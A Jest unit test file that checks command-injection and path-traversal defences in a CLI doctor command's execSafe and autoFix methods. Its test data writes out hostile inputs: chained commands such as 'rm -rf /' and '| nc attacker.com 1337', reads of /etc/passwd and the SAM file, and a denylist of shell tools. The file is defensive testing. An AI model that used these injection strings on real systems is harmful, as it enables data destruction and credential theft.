/**
 * @fileoverview Unit tests for command injection prevention in doctor-command.js
 * Tests that malicious inputs are properly sanitized and blocked
 *
 * @author DevilsDev Team
 * @since 2.1.8
 */

const { PipelineDoctor } = require("../../../src/cli/doctor-command.js");

describe("Command Injection Prevention", () => {
  let doctor;

  beforeEach(() => {
    doctor = new PipelineDoctor({ configPath: ".ragrc.json" });
  });

  describe("execSafe method", () => {
    test("should reject disallowed commands", async () => {
      const maliciousCommands = [
        "rm",
        "curl",
        "wget",
        "cat",
        "echo",
        "ls",
        "bash",
        "sh",
        "cmd",
        "powershell",
      ];

      for (const command of maliciousCommands) {
        await expect(doctor.execSafe(command, [])).rejects.toThrow(
          `Command not allowed: ${command}`,
        );
      }
    });

    test("should allow only whitelisted commands", async () => {
      const allowedCommands = ["npm", "chmod", "node"];

      for (const command of allowedCommands) {
        // Mock execFileAsync to avoid actual execution
        const originalExecFile = require("child_process").execFile;
        const mockExecFile = jest.fn((cmd, args, options, callback) => {
          callback(null, { stdout: "mocked output", stderr: "" });
        });
        require("child_process").execFile = mockExecFile;

        try {
          await doctor.execSafe(command, ["--version"]);
          expect(mockExecFile).toHaveBeenCalledWith(
            command,
            ["--version"],
            expect.objectContaining({ shell: false }),
            expect.any(Function),
          );
        } finally {
          require("child_process").execFile = originalExecFile;
        }
      }
    });

    test("should sanitize shell metacharacters from arguments", async () => {
      const maliciousArgs = [
        "; rm -rf /",
        "&& whoami",
        "`cat /etc/passwd`",
        "$(whoami)",
        "| nc attacker.com 1337",
        "> /tmp/backdoor",
        "< /dev/zero",
        '"$(rm -rf /)"',
        "'`whoami`'",
        "${HOME}/../../../etc/passwd",
        "test\\; echo hacked",
        "file.txt{,.bak}",
        "test[0-9]*.log",
      ];

      // Mock execFileAsync
      const originalExecFile = require("child_process").execFile;
      const mockExecFile = jest.fn((cmd, args, options, callback) => {
        callback(null, { stdout: "mocked output", stderr: "" });
      });
      require("child_process").execFile = mockExecFile;

      try {
        for (const maliciousArg of maliciousArgs) {
          await doctor.execSafe("npm", [maliciousArg]);

          // Verify the argument was sanitized (shell metacharacters removed)
          const sanitizedArg = maliciousArg.replace(
            /[;&|`$(){}[\]<>"'\\]/g,
            "",
          );
          expect(mockExecFile).toHaveBeenCalledWith(
            "npm",
            [sanitizedArg],
            expect.objectContaining({ shell: false }),
            expect.any(Function),
          );
        }
      } finally {
        require("child_process").execFile = originalExecFile;
      }
    });

    test("should reject non-string arguments", async () => {
      const invalidArgs = [
        [123],
        [null],
        [undefined],
        [{}],
        [[]],
        [true],
        [Symbol("test")],
      ];

      for (const args of invalidArgs) {
        await expect(doctor.execSafe("npm", args)).rejects.toThrow(
          "All arguments must be strings",
        );
      }
    });

    test("should use shell: false to prevent shell injection", async () => {
      // Mock execFileAsync
      const originalExecFile = require("child_process").execFile;
      const mockExecFile = jest.fn((cmd, args, options, callback) => {
        callback(null, { stdout: "mocked output", stderr: "" });
      });
      require("child_process").execFile = mockExecFile;

      try {
        await doctor.execSafe("npm", ["--version"]);

        expect(mockExecFile).toHaveBeenCalledWith(
          "npm",
          ["--version"],
          expect.objectContaining({
            shell: false,
            timeout: 30000,
          }),
          expect.any(Function),
        );
      } finally {
        require("child_process").execFile = originalExecFile;
      }
    });

    test("should set execution timeout", async () => {
      // Mock execFileAsync
      const originalExecFile = require("child_process").execFile;
      const mockExecFile = jest.fn((cmd, args, options, callback) => {
        callback(null, { stdout: "mocked output", stderr: "" });
      });
      require("child_process").execFile = mockExecFile;

      try {
        await doctor.execSafe("npm", ["--version"], { timeout: 5000 });

        expect(mockExecFile).toHaveBeenCalledWith(
          "npm",
          ["--version"],
          expect.objectContaining({
            timeout: 5000,
          }),
          expect.any(Function),
        );
      } finally {
        require("child_process").execFile = originalExecFile;
      }
    });
  });

  describe("autoFix method security", () => {
    test("should use execSafe for npm install", async () => {
      const issue = {
        code: "NPM_DEPENDENCY_MISSING",
        autoFixable: true,
      };

      // Mock execSafe method
      const mockExecSafe = jest
        .fn()
        .mockResolvedValue({ stdout: "Dependencies installed" });
      doctor.execSafe = mockExecSafe;

      const result = await doctor.autoFix(issue);

      expect(mockExecSafe).toHaveBeenCalledWith("npm", [
        "install",
        "--no-fund",
        "--no-audit",
      ]);
      expect(result.success).toBe(true);
      expect(result.message).toBe("Dependencies installed");
    });

    test("should validate config path for chmod", async () => {
      const issue = {
        code: "INSECURE_PERMISSIONS",
        autoFixable: true,
      };

      // Test with path outside project directory
      doctor.options.configPath = "../../../etc/passwd";

      const result = await doctor.autoFix(issue);

      expect(result.success).toBe(false);
      expect(result.message).toContain("Config path outside project directory");
    });

    test("should use execSafe for chmod with validated path", async () => {
      const issue = {
        code: "INSECURE_PERMISSIONS",
        autoFixable: true,
      };

      doctor.options.configPath = ".ragrc.json";

      // Mock execSafe method
      const mockExecSafe = jest.fn().mockResolvedValue({ stdout: "" });
      doctor.execSafe = mockExecSafe;

      const result = await doctor.autoFix(issue);

      expect(mockExecSafe).toHaveBeenCalledWith("chmod", [
        "600",
        expect.stringMatching(/\.ragrc\.json$/),
      ]);
      expect(result.success).toBe(true);
      expect(result.message).toBe("Permissions updated");
    });
  });

  describe("Legacy exec method removal", () => {
    test("should not have vulnerable exec method", () => {
      // Verify the old exec method doesn't exist
      expect(doctor.exec).toBeUndefined();
    });

    test("should not import exec from child_process in global scope", () => {
      const fs = require("fs");
      const doctorSource = fs.readFileSync(
        require.resolve("../../../src/cli/doctor-command.js"),
        "utf8",
      );

      // Should not have exec imported globally
      expect(doctorSource).not.toMatch(
        /const\s+{\s*exec\s*}\s*=\s*require\s*\(\s*['"]child_process['"]\s*\)/,
      );

      // Should only use execFile
      expect(doctorSource).toMatch(/execFile/);
    });
  });

  describe("Input validation comprehensive tests", () => {
    test("should handle path traversal attempts", async () => {
      const pathTraversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "\\\\evil-server\\share\\malware.exe",
      ];

      for (const maliciousPath of pathTraversalAttempts) {
        doctor.options.configPath = maliciousPath;

        const issue = {
          code: "INSECURE_PERMISSIONS",
          autoFixable: true,
        };

        const result = await doctor.autoFix(issue);
        expect(result.success).toBe(false);
        expect(result.message).toContain("outside project directory");
      }
    });

    test("should prevent command chaining in arguments", async () => {
      const chainedCommands = [
        "install; cat /etc/passwd",
        "install && rm -rf /",
        "install | nc attacker.com 1337",
        "install > /tmp/backdoor",
        "install < /dev/zero",
      ];

      // Mock execFileAsync
      const originalExecFile = require("child_process").execFile;
      const mockExecFile = jest.fn((cmd, args, options, callback) => {
        callback(null, { stdout: "mocked output", stderr: "" });
      });
      require("child_process").execFile = mockExecFile;

      try {
        for (const chainedCommand of chainedCommands) {
          await doctor.execSafe("npm", [chainedCommand]);

          // Verify shell metacharacters were removed
          const sanitizedArg = chainedCommand.replace(
            /[;&|`$(){}[\]<>"'\\]/g,
            "",
          );
          expect(mockExecFile).toHaveBeenCalledWith(
            "npm",
            [sanitizedArg],
            expect.objectContaining({ shell: false }),
            expect.any(Function),
          );
        }
      } finally {
        require("child_process").execFile = originalExecFile;
      }
    });
  });
});
